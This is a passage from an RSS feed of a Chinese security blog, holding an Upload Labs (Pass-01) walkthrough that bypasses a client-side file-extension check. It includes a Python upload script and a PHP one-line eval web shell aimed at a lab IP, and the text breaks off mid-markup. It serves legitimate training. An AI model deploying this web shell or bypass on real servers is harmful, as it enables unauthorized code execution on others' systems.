<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>摸鱼小窝 – 任意文件上传</title>
    <link>http://localhost:1313/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
    <description>Recent content in 任意文件上传 on 摸鱼小窝</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-CN</language>
    <lastBuildDate>Mon, 28 Apr 2025 17:02:52 +0800</lastBuildDate>
    
	  <atom:link href="http://localhost:1313/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>Upload Labs 攻略</title>
      <link>http://localhost:1313/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs-%E6%94%BB%E7%95%A5/</link>
      <pubDate>Mon, 28 Apr 2025 17:02:52 +0800</pubDate>
      
      <guid>http://localhost:1313/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs-%E6%94%BB%E7%95%A5/</guid>
      <description>
        
        
        &lt;h2&gt;upload-labs 简介&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;upload-labs-简介&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#upload-labs-%e7%ae%80%e4%bb%8b&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;upload-labs 是一个使用 php 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场，旨在帮助大家对上传漏洞有一个全面的了解，目前一共 20 关，每一关都包含着不同上传方式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;每一关没有固定的通关方法，大家不要自限思维！&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;本项目提供的 writeup 只是起一个参考作用，希望大家可以分享出自己的通关思路。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实在没有思路时，可以点击查看提示。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果黑盒情况下，实在做不出，可以点击查看源码。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;后续:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如在渗透测试实战中遇到新的上传漏洞类型，会更新到 upload-labs 中。当然如果你也希望参加到这个工作当中，欢迎 pull requests 给我!&lt;/p&gt;
&lt;p&gt;项目地址：https://github.com/c0ny1/upload-labs&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0.3k88gqmp8o.webp&#34; alt=&#34;文件上传&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-01&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-01&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-01&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;尝试上传 &lt;code&gt;fish.php&lt;/code&gt;，提示只能上传 &lt;code&gt;.jpg|.png|.gif&lt;/code&gt; 类型的文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_18-58-11.73u5gkyjm9.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传文件后抓包失败，考虑是否为客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，检查页面元素发现 &lt;code&gt;JavaScript&lt;/code&gt; 内容&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;checkFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementsByName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;请选择要上传的文件!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//定义允许上传的文件类型
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;allow_ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.jpg|.png|.gif&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//提取上传文件的类型
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ext_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;lastIndexOf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//判断上传文件类型是否允许上传
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;allow_ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;indexOf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ext_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errMsg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;该文件不允许上传，请上传&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;allow_ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;类型的文件,当前文件类型为：&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ext_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;errMsg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;1、禁用 JavaScript&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用扩展 &lt;code&gt;Disable JavaScript&lt;/code&gt; 禁用 JavaScript 后直接上传 &lt;code&gt;fish.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_19-49-06.77drecl2w4.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、requests 请求模拟&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用 Python 的 &lt;code&gt;requests&lt;/code&gt; 模块进行模拟请求，绕过客户端检查&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://192.168.126.129/upload-labs-0.1/Pass-01/index.php&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fish.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php @eval($_POST[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;fish&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;]) ?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;上传&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;Referer&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://192.168.126.129/upload-labs-0.1/Pass-01/index.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;Upgrade-Insecure-Requests&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;User-Agent&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;Origin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://192.168.126.129&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;Accept&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;Accept-Language&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;Accept-Encoding&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;gzip, deflate&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;response_text/upload-labs-less01.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Success&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;3、劫持请求修改文件后缀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将 &lt;code&gt;fish.php&lt;/code&gt; 的后缀名修改为 &lt;code&gt;.jpg&lt;/code&gt; 进行上传，绕过客户端检查后劫持请求，将 &lt;code&gt;filename=fish.jpg&lt;/code&gt; 修改为 &lt;code&gt;filename=fish.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_19-42-23.9kgdvjq8af.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、复制 html 到本地修改&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将整个 &lt;code&gt;html&lt;/code&gt; 代码复制到本地，删除 &lt;code&gt;javascript&lt;/code&gt; 部分的内容，为 &lt;code&gt;form&lt;/code&gt; 添加 &lt;code&gt;action&lt;/code&gt; 属性（表单提交数据的目标地址），直接提交 &lt;code&gt;fish.php&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://192.168.126.129/upload-labs-0.1/Pass-01/index.php&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;enctype&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;multipart/form-data&amp;#34;&lt;/span&gt; &lt;span 